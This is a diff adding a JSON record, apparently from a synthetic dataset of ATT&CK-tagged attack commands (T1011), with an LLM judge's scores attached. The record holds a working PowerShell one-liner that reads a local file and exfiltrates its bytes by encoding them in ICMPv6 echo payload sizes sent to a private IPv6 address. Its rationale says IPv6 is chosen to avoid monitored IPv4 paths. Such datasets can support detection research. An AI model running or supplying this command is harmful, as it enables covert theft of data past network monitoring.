@@ -1,0 +1,37 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$sync='fe80::1%13'; $d='fd00:c001::7'; Test-Connection -ComputerName $sync -Count 1 -BufferSize 333 -IPv6 -Quiet | Out-Null; [IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin') | ForEach-Object { Test-Connection -ComputerName $d -Count 1 -BufferSize (333 + $_) -IPv6 -Quiet | Out-Null }",
+  "explanation": "Sends a sync marker ICMPv6 echo, then exfiltrates bytes via payload size to a ULA, making use of an alternate network medium per T1011.",
+  "rationale_steps": [
+    "Emit a distinct-size ICMPv6 echo as a synchronization preamble.",
+    "Stream file bytes by encoding them in -BufferSize with a known base.",
+    "Use IPv6 destinations to avoid common monitored IPv4 paths."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f38205c7-bcd0af6a",
+  "source_prompt_hash": "f38205c7",
+  "timestamp_utc": "2025-09-30T08:38:57.416507Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with valid Test-Connection parameters, balanced quoting/parentheses, and proper pipeline/expressions.",
+        "semantic_score": 4,
+        "semantic_justification": "It plausibly exfiltrates file bytes by encoding them into ICMPv6 echo payload sizes to a ULA using Test-Connection, though it does not involve system script proxy execution and the T1011 mapping is arguable.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2025-10-01T21:01:36.276849Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
